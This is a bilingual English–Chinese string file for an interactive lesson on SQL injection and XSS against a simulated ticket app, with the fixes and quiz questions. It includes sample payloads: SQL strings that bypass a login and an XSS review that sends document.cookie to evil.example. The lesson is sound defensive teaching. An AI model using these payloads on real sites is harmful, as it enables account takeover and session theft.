@@ -1,0 +1,845 @@
+{
+ "page": "sql-injection-xss",
+ "segments": [
+  {
+   "kind": "attr",
+   "en": "width=device-width, initial-scale=1, viewport-fit=cover",
+   "zh": "="
+  },
+  {
+   "kind": "attr",
+   "en": "Attack a sandboxed fake ticket app with SQL injection and XSS, then apply the fix and try again.",
+   "zh": "用 SQL 注入和 XSS 攻擊一個沙盒裡的假售票 App，再套用修法，重新攻擊一次。"
+  },
+  {
+   "kind": "attr",
+   "en": "Sections",
+   "zh": "章節"
+  },
+  {
+   "kind": "attr",
+   "en": "Simulated browser showing the concert page",
+   "zh": "模擬瀏覽器，顯示演唱會頁面"
+  },
+  {
+   "kind": "attr",
+   "en": "Vulnerable and fixed code",
+   "zh": "有漏洞與修好後的程式碼"
+  },
+  {
+   "kind": "attr",
+   "en": "Pages",
+   "zh": "頁面"
+  },
+  {
+   "kind": "html",
+   "en": "SQL Injection and XSS · System Design Lab",
+   "zh": "SQL 注入與 XSS · System Design Lab"
+  },
+  {
+   "kind": "html",
+   "en": "system<b>.design.lab</b>",
+   "zh": "="
+  },
+  {
+   "kind": "html",
+   "en": "SQL injection",
+   "zh": "SQL 注入"
+  },
+  {
+   "kind": "html",
+   "en": "XSS",
+   "zh": "="
+  },
+  {
+   "kind": "html",
+   "en": "The code",
+   "zh": "程式碼"
+  },
+  {
+   "kind": "html",
+   "en": "Recap",
+   "zh": "重點整理"
+  },
+  {
+   "kind": "html",
+   "en": "page 4 · stage 1 · one server",
+   "zh": "第 4 頁 · 階段 1 · 一台伺服器"
+  },
+  {
+   "kind": "html",
+   "en": "SQL injection, cross-site scripting (XSS)",
+   "zh": "SQL 注入、跨站腳本（XSS）"
+  },
+  {
+   "kind": "html",
+   "en": "The attack is just text. <em>The bug is treating it as code.</em>",
+   "zh": "攻擊只是一段文字。<em>真正的漏洞是把它當成程式碼。</em>"
+  },
+  {
+   "kind": "html",
+   "en": "<b>Encore</b>Encore has a login form and a review box under every concert. Both take whatever a user types and put it somewhere: into a database query, and into a web page. Below is a sandboxed copy of each. Nothing here touches a real database or runs real scripts.",
+   "zh": "<b>Encore</b>Encore 有一個登入表單，每場演唱會下面還有評論框。兩者都會把使用者輸入的內容放到某個地方：放進資料庫查詢，以及放進網頁。下面是兩者各自的沙盒副本。這裡不會碰到真的資料庫，也不會執行真的腳本。"
+  },
+  {
+   "kind": "html",
+   "en": "Start attacking ↓",
+   "zh": "開始攻擊 ↓"
+  },
+  {
+   "kind": "html",
+   "en": "sandbox 1 · sql injection",
+   "zh": "沙盒 1 · SQL 注入"
+  },
+  {
+   "kind": "html",
+   "en": "string building",
+   "zh": "字串拼接"
+  },
+  {
+   "kind": "html",
+   "en": "Log in as the admin without knowing the password",
+   "zh": "不知道密碼，也能用管理員身分登入"
+  },
+  {
+   "kind": "html",
+   "en": "Email",
+   "zh": "Email"
+  },
+  {
+   "kind": "html",
+   "en": "Password",
+   "zh": "密碼"
+  },
+  {
+   "kind": "html",
+   "en": "How the server builds the query",
+   "zh": "伺服器怎麼組出查詢"
+  },
+  {
+   "kind": "html",
+   "en": "&nbsp;",
+   "zh": "="
+  },
+  {
+   "kind": "html",
+   "en": "Log in",
+   "zh": "登入"
+  },
+  {
+   "kind": "html",
+   "en": "What the database receives",
+   "zh": "資料庫實際收到的內容"
+  },
+  {
+   "kind": "html",
+   "en": "orange",
+   "zh": "橘色"
+  },
+  {
+   "kind": "html",
+   "en": "= what you typed, read as SQL.",
+   "zh": "＝你輸入的內容，被當成 SQL 讀取。"
+  },
+  {
+   "kind": "html",
+   "en": "green",
+   "zh": "綠色"
+  },
+  {
+   "kind": "html",
+   "en": "= what you typed, kept as data. Struck through = ignored by the database.",
+   "zh": "＝你輸入的內容，被保留為資料。刪除線＝被資料庫忽略。"
+  },
+  {
+   "kind": "html",
+   "en": "Pick an attack above, or type your own, then press Log in.",
+   "zh": "從上面選一種攻擊，或自己輸入，然後按「登入」。"
+  },
+  {
+   "kind": "html",
+   "en": "sandbox 2 · cross-site scripting",
+   "zh": "沙盒 2 · 跨站腳本"
+  },
+  {
+   "kind": "html",
+   "en": "innerHTML",
+   "zh": "="
+  },
+  {
+   "kind": "html",
+   "en": "Post a review that attacks every fan who reads it",
+   "zh": "發一則會攻擊每位讀者的評論"
+  },
+  {
+   "kind": "html",
+   "en": "Your review of “Reunion Tour · Night 1”",
+   "zh": "你對「重聚巡演 · 第 1 晚」的評論"
+  },
+  {
+   "kind": "html",
+   "en": "How the page shows reviews",
+   "zh": "頁面怎麼顯示評論"
+  },
+  {
+   "kind": "html",
+   "en": "Post review",
+   "zh": "送出評論"
+  },
+  {
+   "kind": "html",
+   "en": "encore.example/concerts/reunion-night-1 · as another fan sees it (simulated)",
+   "zh": "encore.example/concerts/reunion-night-1 · 其他歌迷看到的畫面（模擬）"
+  },
+  {
+   "kind": "html",
+   "en": "Reviews render in a simulated browser. Real HTML from the box is never inserted into this page.",
+   "zh": "評論會在模擬瀏覽器中呈現。輸入框裡的 HTML 從來不會真的插入這個頁面。"
+  },
+  {
+   "kind": "html",
+   "en": "Try this",
+   "zh": "試試看"
+  },
+  {
+   "kind": "html",
+   "en": "The one difference",
+   "zh": "關鍵差別"
+  },
+  {
+   "kind": "html",
+   "en": "Both attacks work the same way: <b>user text gets mixed into code</b> (SQL or HTML) and the computer can't tell where your text ends and the code starts. The fix also works the same way: keep the data separate from the code. Use <b>parameters</b> for SQL, and <b>escape output</b> for HTML.",
+   "zh": "兩種攻擊的原理相同：<b>使用者的文字被混進程式碼</b>（SQL 或 HTML），電腦分不出你的文字在哪裡結束、程式碼從哪裡開始。修法的原理也相同：讓資料和程式碼分開。SQL 用<b>參數</b>，HTML 用<b>輸出跳脫（escape）</b>。"
+  },
+  {
+   "kind": "html",
+   "en": "act 3 · the real thing",
+   "zh": "第 3 幕 · 真實世界"
+  },
+  {
+   "kind": "html",
+   "en": "code",
+   "zh": "程式碼"
+  },
+  {
+   "kind": "html",
+   "en": "The bug and the fix, side by side",
+   "zh": "漏洞與修法並排比較"
+  },
+  {
+   "kind": "html",
+   "en": "Each fix is a one-line change. <b>Hover or tap a line.</b>",
+   "zh": "每個修法都只要改一行。<b>把滑鼠移到某一行上，或點一下。</b>"
+  },
+  {
+   "kind": "html",
+   "en": "👆 pick a line",
+   "zh": "👆 選一行"
+  },
+  {
+   "kind": "html",
+   "en": "Each highlighted line maps to a sandbox mode.",
+   "zh": "每一行反白後，都會對應到沙盒的一種模式。"
+  },
+  {
+   "kind": "html",
+   "en": "recap · keep this",
+   "zh": "重點整理 · 帶走這些"
+  },
+  {
+   "kind": "html",
+   "en": "The whole page on one screen",
+   "zh": "整頁濃縮在一個畫面"
+  },
+  {
+   "kind": "html",
+   "en": "Attacks the database",
+   "zh": "攻擊資料庫"
+  },
+  {
+   "kind": "html",
+   "en": "Input glued into a query string changes the query itself: skip the password check, read other users' data, delete tables. Fix: parameterized queries.",
+   "zh": "被拼進查詢字串的輸入會改變查詢本身：跳過密碼檢查、讀取別人的資料、刪除資料表。修法：參數化查詢。"
+  },
+  {
+   "kind": "html",
+   "en": "Attacks your users",
+   "zh": "攻擊你的使用者"
+  },
+  {
+   "kind": "html",
+   "en": "Input inserted into a page as HTML becomes a script that runs in every visitor's browser, as them. Fix: insert text, not HTML (escape output), plus a CSP.",
+   "zh": "以 HTML 插入頁面的輸入會變成腳本，在每位訪客的瀏覽器裡以他們的身分執行。修法：插入文字而不是 HTML（輸出跳脫），再加上 CSP。"
+  },
+  {
+   "kind": "html",
+   "en": "The rule",
+   "zh": "原則"
+  },
+  {
+   "kind": "html",
+   "en": "Data ≠ code",
+   "zh": "資料 ≠ 程式碼"
+  },
+  {
+   "kind": "html",
+   "en": "Never build code by gluing user text into it. Let the database driver or the browser keep the two apart.",
+   "zh": "永遠不要把使用者的文字拼進程式碼。交給資料庫驅動程式或瀏覽器把兩者分開。"
+  },
+  {
+   "kind": "html",
+   "en": "The tradeoff",
+   "zh": "取捨"
+  },
+  {
+   "kind": "html",
+   "en": "The fixes cost almost nothing, and modern frameworks do them by default. The risk lives in the escape hatches: raw SQL helpers, <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>|safe</code>. Review every one.",
+   "zh": "這些修法幾乎沒有成本，現代框架也預設就會做。風險藏在那些逃生口：原生 SQL 輔助函式、<code>innerHTML</code>、<code>dangerouslySetInnerHTML</code>、<code>|safe</code>。每一個都要審查。"
+  },
+  {
+   "kind": "html",
+   "en": "Check it",
+   "zh": "考考自己"
+  },
+  {
+   "kind": "js",
+   "en": "'admin@encore.example'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Xk9#long-secret'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Admin'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'admin: can see every order and refund any ticket'",
+   "zh": "'管理員：可以看到每一筆訂單，並退任何一張票'"
+  },
+  {
+   "kind": "js",
+   "en": "'ana@encore.example'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Ana'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'ben@encore.example'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Ben'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "`<span class=\"k\">SELECT</span> * <span class=\"k\">FROM</span> users <span class=\"k\">WHERE</span> email = $1 <span class=\"k\">AND</span> password = $2\\n\\nparams: [ \"<span class=\"u data\">${esc(email)}</span>\", \"<span class=\"u data\">${esc(pw)}</span>\" ]`",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "\"SELECT * FROM users WHERE email = '\"",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "\"' AND password = '\"",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "`<span class=\"${cls}\">${esc(buf)}</span>`",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Normal login'",
+   "zh": "'正常登入'"
+  },
+  {
+   "kind": "js",
+   "en": "'Skip the password'",
+   "zh": "'跳過密碼'"
+  },
+  {
+   "kind": "js",
+   "en": "\"admin@encore.example' --\"",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Always true'",
+   "zh": "'永遠為真'"
+  },
+  {
+   "kind": "js",
+   "en": "\"' OR '1'='1' --\"",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'A real name with a quote'",
+   "zh": "'名字裡有單引號的真人'"
+  },
+  {
+   "kind": "js",
+   "en": "\"o'brien@encore.example\"",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Glue strings together'",
+   "zh": "'把字串拼起來'"
+  },
+  {
+   "kind": "js",
+   "en": "'Parameters ($1, $2)'",
+   "zh": "'參數（$1, $2）'"
+  },
+  {
+   "kind": "js",
+   "en": "'string building'",
+   "zh": "'字串拼接'"
+  },
+  {
+   "kind": "js",
+   "en": "`✕ <b>Logged in as ${r.user.name}</b> (${r.user.role}) without the password. Your text closed the quote early${/--/.test(email) ? ', and <code>--</code> turned the password check into a comment' : ''}${r.rows > 1 ? `. The query matched all ${r.rows} users and the app picked the first one` : ''}.`",
+   "zh": "`✕ <b>以 ${r.user.name} 身分登入</b>（${r.user.role}），完全不需要密碼。你的文字提早結束了引號${/--/.test(email) ? '，而 <code>--</code> 把密碼檢查變成了註解' : ''}${r.rows > 1 ? `。這條查詢符合全部 ${r.rows} 位使用者，App 直接選了第一位` : ''}。`"
+  },
+  {
+   "kind": "js",
+   "en": "`✓ Logged in as ${r.user.name}. Normal login, nothing unusual.`",
+   "zh": "`✓ 以 ${r.user.name} 身分登入。正常登入，沒有異狀。`"
+  },
+  {
+   "kind": "js",
+   "en": "'✕ The database ran a second command and <b>deleted the users table</b> (simulated). Everyone is locked out.'",
+   "zh": "'✕ 資料庫執行了第二道指令，<b>刪掉了 users 資料表</b>（模擬）。所有人都被鎖在外面。'"
+  },
+  {
+   "kind": "js",
+   "en": "`✕ <code>ERROR: syntax error at or near \"${esc(r.near)}\"</code>. The quote in the input broke the query. This error message also tells an attacker the input reaches SQL unprotected.`",
+   "zh": "`✕ <code>ERROR: syntax error at or near \"${esc(r.near)}\"</code>。輸入中的單引號弄壞了查詢。這個錯誤訊息也等於告訴攻擊者：輸入毫無保護地進到了 SQL。`"
+  },
+  {
+   "kind": "js",
+   "en": "'✓ <b>Login failed.</b> The database looked for a user whose email is literally <code>'",
+   "zh": "'✓ <b>登入失敗。</b>資料庫去找 email 字面上就是 <code>'"
+  },
+  {
+   "kind": "js",
+   "en": "'</code>. There isn\\'t one. Your quotes and dashes stayed data.'",
+   "zh": "'</code> 的使用者，結果沒有。你的引號和破折號都還是資料。'"
+  },
+  {
+   "kind": "js",
+   "en": "'✓ Wrong email or password.'",
+   "zh": "'✓ Email 或密碼錯誤。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Cai'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Sound was incredible from the balcony.'",
+   "zh": "'從二樓包廂聽，音響效果超讚。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Dee'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Merch line was long, but worth it.'",
+   "zh": "'周邊排隊排很久，但值得。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Normal review'",
+   "zh": "'一般評論'"
+  },
+  {
+   "kind": "js",
+   "en": "'Best night of my life!!'",
+   "zh": "'人生最棒的一晚！！'"
+  },
+  {
+   "kind": "js",
+   "en": "'Bold text'",
+   "zh": "'粗體字'"
+  },
+  {
+   "kind": "js",
+   "en": "'This was <b>amazing</b>'",
+   "zh": "'這場<b>太神了</b>'"
+  },
+  {
+   "kind": "js",
+   "en": "'Steal cookies'",
+   "zh": "'偷 cookie'"
+  },
+  {
+   "kind": "js",
+   "en": "`<img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\">`",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'Script tag'",
+   "zh": "'Script 標籤'"
+  },
+  {
+   "kind": "js",
+   "en": "'<script>location=\"https://evil.example/fake-login\"<\\/script>'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "`<small>HTML sent to the browser: <code>${esc(esc(r.text))}</code></small>`",
+   "zh": "`<small>送到瀏覽器的 HTML：<code>${esc(esc(r.text))}</code></small>`"
+  },
+  {
+   "kind": "js",
+   "en": "`⚠ <b>Script ran in this visitor's browser</b>: ${/fake-login/.test(r.text) ? 'redirected them to a fake login page' : 'sent their session cookie to evil.example'}. (Simulated.) It runs again for every fan who opens the page.`",
+   "zh": "`⚠ <b>腳本在這位訪客的瀏覽器裡執行了</b>：${/fake-login/.test(r.text) ? '把他們導向假的登入頁' : '把他們的工作階段 cookie 傳到 evil.example'}。（模擬。）每位打開這個頁面的歌迷都會再執行一次。`"
+  },
+  {
+   "kind": "js",
+   "en": "`✕ Fans who have opened this page since the attack: <b>${victims}</b>. Every one of them ran the attacker's code.`",
+   "zh": "`✕ 攻擊之後打開這個頁面的歌迷：<b>${victims}</b> 位。每一位都執行了攻擊者的程式碼。`"
+  },
+  {
+   "kind": "js",
+   "en": "'Insert as HTML (innerHTML)'",
+   "zh": "'以 HTML 插入（innerHTML）'"
+  },
+  {
+   "kind": "js",
+   "en": "'Insert as text (escaped)'",
+   "zh": "'以文字插入（已跳脫）'"
+  },
+  {
+   "kind": "js",
+   "en": "'textContent'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'innerHTML'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'✓ Same reviews, now inserted as text. The attack shows up as harmless characters and nothing runs.'",
+   "zh": "'✓ 同樣的評論，現在以文字插入。攻擊內容只會顯示成無害的字元，什麼都不會執行。'"
+  },
+  {
+   "kind": "js",
+   "en": "'✓ Reviews are inserted as text.'",
+   "zh": "'✓ 評論以文字插入。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Reviews are inserted as HTML.'",
+   "zh": "'評論以 HTML 插入。'"
+  },
+  {
+   "kind": "js",
+   "en": "'You'",
+   "zh": "'你'"
+  },
+  {
+   "kind": "js",
+   "en": "'✓ Posted. The browser shows the characters < and > instead of creating an element, so nothing runs.'",
+   "zh": "'✓ 已送出。瀏覽器顯示的是 < 和 > 這兩個字元，而不是建立元素，所以什麼都不會執行。'"
+  },
+  {
+   "kind": "js",
+   "en": "'✓ Posted. Bold works, because the browser is reading your text as HTML. Hmm…'",
+   "zh": "'✓ 已送出。粗體有效，因為瀏覽器把你的文字當成 HTML 在讀。嗯……'"
+  },
+  {
+   "kind": "js",
+   "en": "'✓ Posted.'",
+   "zh": "'✓ 已送出。'"
+  },
+  {
+   "kind": "js",
+   "en": "'In sandbox 1, log in normally as Ana.'",
+   "zh": "'在沙盒 1 中，以 Ana 的身分正常登入。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Use “Normal login”. Notice where your text lands in the query.'",
+   "zh": "'用「正常登入」。注意你的文字落在查詢的哪裡。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Log in as <b>Admin</b> without the password.'",
+   "zh": "'不輸入密碼，以<b>管理員</b>身分登入。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Try “Skip the password”. Watch what <code>--</code> does to the rest of the query.'",
+   "zh": "'試試「跳過密碼」。看看 <code>--</code> 對查詢的其餘部分做了什麼。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Switch to <b>Parameters</b> and try the same attack.'",
+   "zh": "'切換到<b>參數</b>，再試一次同樣的攻擊。'"
+  },
+  {
+   "kind": "js",
+   "en": "'The query and your text now travel separately.'",
+   "zh": "'現在查詢和你的文字是分開傳送的。'"
+  },
+  {
+   "kind": "js",
+   "en": "'In sandbox 2, post the <b>Steal cookies</b> review.'",
+   "zh": "'在沙盒 2 中，送出<b>偷 cookie</b> 這則評論。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Watch what other fans would experience.'",
+   "zh": "'看看其他歌迷會遇到什麼。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Switch to <b>Insert as text</b>.'",
+   "zh": "'切換到<b>以文字插入</b>。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Same review, same page. It just stops being code.'",
+   "zh": "'同樣的評論、同樣的頁面，只是它不再是程式碼。'"
+  },
+  {
+   "kind": "js",
+   "en": "'<span class=\"c\">// ✕ SQL built by gluing strings</span>'",
+   "zh": "'<span class=\"c\">// ✕ 用拼接字串組出 SQL</span>'"
+  },
+  {
+   "kind": "js",
+   "en": "'db.query(<span class=\"s\">\"SELECT * FROM users WHERE email = \\'\"</span> + email +'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'         <span class=\"s\">\"\\' AND password = \\'\"</span> + pw + <span class=\"s\">\"\\'\"</span>);'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'<span class=\"c\">// ✓ Parameterized: query and data travel separately</span>'",
+   "zh": "'<span class=\"c\">// ✓ 參數化：查詢和資料分開傳送</span>'"
+  },
+  {
+   "kind": "js",
+   "en": "'db.query(<span class=\"s\">\"SELECT * FROM users WHERE email = $1\"</span>, [email]);'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'<span class=\"c\">//   …then compare a password hash, never the plain text</span>'",
+   "zh": "'<span class=\"c\">//   ……接著比對密碼雜湊，絕不比對明文</span>'"
+  },
+  {
+   "kind": "js",
+   "en": "'<span class=\"c\">// ✕ Puts the review into the page as HTML</span>'",
+   "zh": "'<span class=\"c\">// ✕ 把評論當成 HTML 放進頁面</span>'"
+  },
+  {
+   "kind": "js",
+   "en": "'reviewEl.<span class=\"key\">innerHTML</span> = review.text;'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'<span class=\"c\">// ✓ Puts it in as text</span>'",
+   "zh": "'<span class=\"c\">// ✓ 把它當成文字放進去</span>'"
+  },
+  {
+   "kind": "js",
+   "en": "'reviewEl.<span class=\"key\">textContent</span> = review.text;'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'<span class=\"c\"># ✓ Safety net: an HTTP response header</span>'",
+   "zh": "'<span class=\"c\"># ✓ 安全網：一個 HTTP 回應標頭</span>'"
+  },
+  {
+   "kind": "js",
+   "en": "'<span class=\"key\">Content-Security-Policy</span>: script-src <span class=\"s\">\\'self\\'</span>'",
+   "zh": "="
+  },
+  {
+   "kind": "js",
+   "en": "'String building'",
+   "zh": "'字串拼接'"
+  },
+  {
+   "kind": "js",
+   "en": "'The database gets one long string and has no way to know which part came from the user. A quote in the input ends the string early, and whatever follows is read as SQL.'",
+   "zh": "'資料庫收到一長串字串，無從得知哪一部分來自使用者。輸入裡的單引號會提早結束字串，後面的內容全被當成 SQL 讀取。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Parameters'",
+   "zh": "'參數'"
+  },
+  {
+   "kind": "js",
+   "en": "'The query is sent with placeholders. The values are sent separately and are <b>always</b> treated as data, so quotes and dashes in them can\\'t change the query. Every database driver and ORM supports this.'",
+   "zh": "'查詢是帶著佔位符送出的，值則另外傳送，而且<b>永遠</b>被當成資料，所以裡面的引號和破折號改變不了查詢。每個資料庫驅動程式和 ORM 都支援。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Passwords'",
+   "zh": "'密碼'"
+  },
+  {
+   "kind": "js",
+   "en": "'The sandbox compares plain passwords to keep things simple. Real apps store a slow hash (bcrypt, argon2) and compare hashes, so a leaked table doesn\\'t leak passwords.'",
+   "zh": "'為了簡單，沙盒直接比對明文密碼。真實的 App 會儲存慢速雜湊（bcrypt、argon2）並比對雜湊值，這樣資料表外洩也不會洩漏密碼。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Tells the browser “parse this as HTML”. Tags become elements, and event handlers like <code>onerror</code> become running code. React\\'s <code>dangerouslySetInnerHTML</code> does the same.'",
+   "zh": "'告訴瀏覽器「把這段當成 HTML 解析」。標籤會變成元素，像 <code>onerror</code> 這樣的事件處理器會變成會執行的程式碼。React 的 <code>dangerouslySetInnerHTML</code> 也一樣。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Tells the browser “this is text”. <code>&lt;</code> shows up as a character. Frameworks like React, Vue and Svelte do this by default when you write <code>{review.text}</code>.'",
+   "zh": "'告訴瀏覽器「這是文字」。<code>&lt;</code> 會顯示成一個字元。React、Vue、Svelte 等框架在你寫 <code>{review.text}</code> 時預設就會這樣做。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Content Security Policy'",
+   "zh": "'內容安全政策（CSP）'"
+  },
+  {
+   "kind": "js",
+   "en": "'A second layer of defense: the browser refuses to run inline scripts and scripts from other sites. It catches the bugs you miss. It doesn\\'t replace escaping.'",
+   "zh": "'第二道防線：瀏覽器拒絕執行行內腳本和其他網站的腳本。它能攔下你漏掉的漏洞，但不能取代跳脫。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Ben suggests blocking SQL injection by deleting quote characters from every input. What\\'s the problem?'",
+   "zh": "'Ben 建議把每個輸入裡的單引號都刪掉，藉此擋下 SQL 注入。問題在哪裡？'"
+  },
+  {
+   "kind": "js",
+   "en": "'Nothing. Without quotes, injection is impossible'",
+   "zh": "'沒問題。沒有單引號就不可能注入'"
+  },
+  {
+   "kind": "js",
+   "en": "'Attackers have many tricks that don\\'t need a quote (numeric fields, encodings, other syntax). And O\\'Brien can no longer sign up.'",
+   "zh": "'攻擊者有很多不需要單引號的手法（數字欄位、編碼、其他語法）。而且 O\\'Brien 從此無法註冊。'"
+  },
+  {
+   "kind": "js",
+   "en": "'It breaks real input and can be bypassed. Parameterized queries fix the cause.'",
+   "zh": "'它會弄壞正常輸入，也能被繞過。參數化查詢才是根本解法。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Filtering input guesses which characters are dangerous. Parameters remove the possibility of input becoming SQL at all.'",
+   "zh": "'過濾輸入是在猜哪些字元危險。參數則讓輸入完全不可能變成 SQL。'"
+  },
+  {
+   "kind": "js",
+   "en": "'It works, but it slows the database down'",
+   "zh": "'有用，但會拖慢資料庫'"
+  },
+  {
+   "kind": "js",
+   "en": "'Speed isn\\'t the issue. It\\'s an incomplete defense that also rejects valid data.'",
+   "zh": "'問題不在速度。它是不完整的防禦，還會擋掉合法資料。'"
+  },
+  {
+   "kind": "js",
+   "en": "'An attacker posts a review that runs a script. Whose data is at risk?'",
+   "zh": "'攻擊者發了一則會執行腳本的評論。誰的資料有危險？'"
+  },
+  {
+   "kind": "js",
+   "en": "'Only the attacker\\'s, since it\\'s their review'",
+   "zh": "'只有攻擊者自己的，因為那是他的評論'"
+  },
+  {
+   "kind": "js",
+   "en": "'The script runs in the browser of whoever views the page, not the person who wrote it.'",
+   "zh": "'腳本是在瀏覽這個頁面的人的瀏覽器中執行，不是在作者的。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Every fan who opens the page: the script can act as them and read what they see'",
+   "zh": "'每位打開這個頁面的歌迷：腳本可以冒用他們的身分，讀取他們看到的內容'"
+  },
+  {
+   "kind": "js",
+   "en": "'That\\'s what makes stored XSS serious. One post, many victims.'",
+   "zh": "'這就是儲存型 XSS 嚴重的地方：一則貼文，大量受害者。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Only the database\\'s'",
+   "zh": "'只有資料庫的'"
+  },
+  {
+   "kind": "js",
+   "en": "'XSS runs in browsers, not on the server. It targets your users.'",
+   "zh": "'XSS 是在瀏覽器裡執行，不是在伺服器上。它攻擊的是你的使用者。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Cai wants reviews to support bold and links, so they plan to switch to <code>dangerouslySetInnerHTML</code>. What\\'s the safe way to do it?'",
+   "zh": "'Cai 想讓評論支援粗體和連結，打算改用 <code>dangerouslySetInnerHTML</code>。安全的做法是什麼？'"
+  },
+  {
+   "kind": "js",
+   "en": "'Just do it. React will escape it anyway.'",
+   "zh": "'直接用。React 反正會跳脫。'"
+  },
+  {
+   "kind": "js",
+   "en": "'The name is a warning: React skips escaping for exactly this prop.'",
+   "zh": "'這個名字本身就是警告：React 正是對這個屬性跳過跳脫。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Use a limited format (like Markdown) or an HTML sanitizer with a strict allowlist, plus a CSP'",
+   "zh": "'使用受限的格式（例如 Markdown），或搭配嚴格白名單的 HTML 清理器，再加上 CSP'"
+  },
+  {
+   "kind": "js",
+   "en": "'Allow only the few tags you need, strip everything else (scripts, event handlers), and keep CSP as a backup.'",
+   "zh": "'只允許你需要的少數標籤，其他全部移除（腳本、事件處理器），並保留 CSP 作為後備。'"
+  },
+  {
+   "kind": "js",
+   "en": "'Check whether the text contains “&lt;script&gt;” and reject it'",
+   "zh": "'檢查文字是否包含「&lt;script&gt;」，有的話就拒絕'"
+  },
+  {
+   "kind": "js",
+   "en": "'Scripts can run without a script tag (like the <code>onerror</code> example). Blocklists always miss something.'",
+   "zh": "'腳本不需要 script 標籤也能執行（像 <code>onerror</code> 那個例子）。黑名單永遠會漏掉東西。'"
+  }
+ ]
+}
